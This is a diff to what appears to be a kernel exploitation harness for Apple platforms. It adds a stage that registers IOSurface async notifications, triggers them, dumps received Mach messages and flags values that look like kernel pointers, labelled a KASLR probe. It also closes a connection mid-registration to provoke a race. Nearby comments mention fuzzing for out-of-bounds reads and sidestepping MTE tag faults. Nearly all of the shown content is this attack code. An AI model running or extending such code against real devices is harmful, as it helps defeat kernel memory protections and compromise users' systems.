@@ -17131,7 +17131,7 @@ new_modes:
             rlog("*** rounds=%d: fast-path to Phase 16 ***\n", rounds);
             goto phase15_done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 228) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -20250,9 +20250,9 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219 && rounds != 225) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 228) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
-            if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227) goto r220_block;
+            if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
 
             dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
                 dispatch_get_global_queue(0, 0), ^{
@@ -26588,6 +26588,176 @@ new_modes:
              * This avoids MTE tag faults because the reclaim allocates a fresh
              * entry with valid MTE tags.
              */
+            if (rounds == 228) {
+                rlog("\n=== r=228: IOSurface notification message inspection ===\n");
+
+                io_service_t svc228 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!svc228) { rlog("  NO svc!\n"); goto phase17_done; }
+
+                /* Create surface */
+                CFMutableDictionaryRef sp228 = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w228 = 32, h228 = 32, bpe228 = 4, bpr228 = w228 * bpe228;
+                CFNumberRef wn228 = CFNumberCreate(NULL, kCFNumberIntType, &w228);
+                CFNumberRef hn228 = CFNumberCreate(NULL, kCFNumberIntType, &h228);
+                CFNumberRef bn228 = CFNumberCreate(NULL, kCFNumberIntType, &bpe228);
+                CFNumberRef rn228 = CFNumberCreate(NULL, kCFNumberIntType, &bpr228);
+                int pf228 = 0x42475241;
+                CFNumberRef pfn228 = CFNumberCreate(NULL, kCFNumberIntType, &pf228);
+                CFDictionarySetValue(sp228, CFSTR("IOSurfaceWidth"), wn228);
+                CFDictionarySetValue(sp228, CFSTR("IOSurfaceHeight"), hn228);
+                CFDictionarySetValue(sp228, CFSTR("IOSurfaceBytesPerElement"), bn228);
+                CFDictionarySetValue(sp228, CFSTR("IOSurfaceBytesPerRow"), rn228);
+                CFDictionarySetValue(sp228, CFSTR("IOSurfacePixelFormat"), pfn228);
+                IOSurfaceRef s228 = IOSurfaceCreate(sp228);
+                if (!s228) { rlog("  Create failed\n"); goto p228_cleanup; }
+                uint32_t sid228 = IOSurfaceGetID(s228);
+                rlog("  Surface ID=%u\n", sid228);
+
+                /* Register notification with known inputs */
+                io_connect_t c228 = IO_OBJECT_NULL;
+                IOServiceOpen(svc228, mach_task_self(), 0, &c228);
+                if (!c228) { rlog("  Open failed\n"); goto p228_cleanup; }
+
+                mach_port_t wp228 = MACH_PORT_NULL;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp228);
+                mach_port_insert_right(mach_task_self(), wp228, wp228, MACH_MSG_TYPE_MAKE_SEND);
+
+                uint64_t ref228 = 0xAA228FEED228AA00ULL;
+                uint64_t inp228[3] = {sid228, 0xBBCC228, 0xDDEE228};
+                kern_return_t kr228 = IOConnectCallAsyncMethod(c228, 17, wp228, &ref228, 1,
+                    NULL, 0, inp228, 24, NULL, NULL, NULL, NULL);
+                rlog("  sel17 register: 0x%x\n", kr228);
+
+                /* Now trigger a notification by modifying the surface */
+                /* Try multiple approaches to trigger the notification */
+                IOSurfaceLock(s228, 0, NULL);
+                memset(IOSurfaceGetBaseAddress(s228), 0xBB, 128);
+                IOSurfaceUnlock(s228, 0, NULL);
+                IOSurfaceIncrementUseCount(s228);
+
+                /* Also try setValue */
+                int trigVal = 0x228;
+                CFNumberRef trigN = CFNumberCreate(NULL, kCFNumberIntType, &trigVal);
+                IOSurfaceSetValue(s228, CFSTR("trigger228"), trigN);
+                CFRelease(trigN);
+
+                /* Short wait for notification delivery */
+                usleep(50000);
+
+                /* Check wake port for messages */
+                rlog("  Checking wake port for messages:\n");
+                for (int mi = 0; mi < 10; mi++) {
+                    uint8_t msgbuf[512];
+                    mach_msg_header_t *hdr = (mach_msg_header_t *)msgbuf;
+                    memset(msgbuf, 0, sizeof(msgbuf));
+                    hdr->msgh_size = sizeof(msgbuf);
+                    hdr->msgh_local_port = wp228;
+                    kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                        0, sizeof(msgbuf), wp228, 10, MACH_PORT_NULL);
+                    if (mr != MACH_MSG_SUCCESS) {
+                        rlog("    msg[%d]: no message (0x%x)\n", mi, mr);
+                        break;
+                    }
+                    rlog("    msg[%d]: size=%u id=0x%x bits=0x%x\n", mi,
+                        hdr->msgh_size, hdr->msgh_id, hdr->msgh_bits);
+                    /* Dump all 64-bit words in the message */
+                    uint64_t *mw = (uint64_t *)msgbuf;
+                    int nwords = hdr->msgh_size / 8;
+                    for (int w = 0; w < nwords && w < 32; w++) {
+                        int is_ptr = ((mw[w] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL);
+                        rlog("      [%2d] 0x%016llx%s\n", w, (unsigned long long)mw[w],
+                            is_ptr ? " *** KERNEL PTR ***" : "");
+                    }
+                }
+
+                /* Also try the IOKit notification mechanism */
+                IONotificationPortRef notifyPort = IONotificationPortCreate(kIOMasterPortDefault);
+                if (notifyPort) {
+                    rlog("  IONotificationPort created\n");
+                    IONotificationPortDestroy(notifyPort);
+                }
+
+                /* Try IOConnectCallAsyncMethod with sel17 on another connection and
+                   check if the original async callback triggers */
+                io_connect_t c228b = IO_OBJECT_NULL;
+                IOServiceOpen(svc228, mach_task_self(), 0, &c228b);
+                if (c228b) {
+                    mach_port_t wp228b = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp228b);
+                    mach_port_insert_right(mach_task_self(), wp228b, wp228b, MACH_MSG_TYPE_MAKE_SEND);
+                    uint64_t ref228b = 0xBB228CAFE228BB00ULL;
+                    uint64_t inp228b[3] = {sid228, 0x11, 0x22};
+                    IOConnectCallAsyncMethod(c228b, 17, wp228b, &ref228b, 1,
+                        NULL, 0, inp228b, 24, NULL, NULL, NULL, NULL);
+
+                    /* Deregister the first connection (simulates race) */
+                    IOServiceClose(c228);
+                    c228 = IO_OBJECT_NULL;
+
+                    /* Wait and check second port */
+                    usleep(50000);
+                    rlog("  After deregistering first conn, checking second port:\n");
+                    for (int mi = 0; mi < 5; mi++) {
+                        uint8_t msgbuf[512];
+                        mach_msg_header_t *hdr = (mach_msg_header_t *)msgbuf;
+                        memset(msgbuf, 0, sizeof(msgbuf));
+                        hdr->msgh_size = sizeof(msgbuf);
+                        hdr->msgh_local_port = wp228b;
+                        kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                            0, sizeof(msgbuf), wp228b, 10, MACH_PORT_NULL);
+                        if (mr != MACH_MSG_SUCCESS) {
+                            rlog("    msg[%d]: none (0x%x)\n", mi, mr);
+                            break;
+                        }
+                        rlog("    msg[%d]: size=%u id=0x%x\n", mi, hdr->msgh_size, hdr->msgh_id);
+                        uint64_t *mw = (uint64_t *)msgbuf;
+                        for (int w = 0; w < (int)(hdr->msgh_size / 8) && w < 32; w++) {
+                            int is_ptr = ((mw[w] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL);
+                            rlog("      [%2d] 0x%016llx%s\n", w, (unsigned long long)mw[w],
+                                is_ptr ? " *** KERNEL PTR ***" : "");
+                        }
+                    }
+
+                    /* Also check original port after close */
+                    rlog("  Checking original port after close:\n");
+                    for (int mi = 0; mi < 5; mi++) {
+                        uint8_t msgbuf[512];
+                        mach_msg_header_t *hdr = (mach_msg_header_t *)msgbuf;
+                        memset(msgbuf, 0, sizeof(msgbuf));
+                        hdr->msgh_size = sizeof(msgbuf);
+                        hdr->msgh_local_port = wp228;
+                        kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                            0, sizeof(msgbuf), wp228, 10, MACH_PORT_NULL);
+                        if (mr != MACH_MSG_SUCCESS) {
+                            rlog("    msg[%d]: none (0x%x)\n", mi, mr);
+                            break;
+                        }
+                        rlog("    msg[%d]: size=%u id=0x%x\n", mi, hdr->msgh_size, hdr->msgh_id);
+                        uint64_t *mw = (uint64_t *)msgbuf;
+                        for (int w = 0; w < (int)(hdr->msgh_size / 8) && w < 32; w++) {
+                            int is_ptr = ((mw[w] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL);
+                            rlog("      [%2d] 0x%016llx%s\n", w, (unsigned long long)mw[w],
+                                is_ptr ? " *** KERNEL PTR ***" : "");
+                        }
+                    }
+
+                    IOServiceClose(c228b);
+                    mach_port_deallocate(mach_task_self(), wp228b);
+                }
+
+                p228_cleanup:
+                if (c228) IOServiceClose(c228);
+                mach_port_deallocate(mach_task_self(), wp228);
+                if (s228) CFRelease(s228);
+                CFRelease(wn228); CFRelease(hn228); CFRelease(bn228); CFRelease(rn228); CFRelease(pfn228);
+                CFRelease(sp228);
+                IOObjectRelease(svc228);
+                rlog("=== r=228 complete ===\n");
+                goto phase17_done;
+            }
+
             if (rounds == 227) {
                 rlog("\n=== r=227: IOSurface property scan via public API ===\n");
 
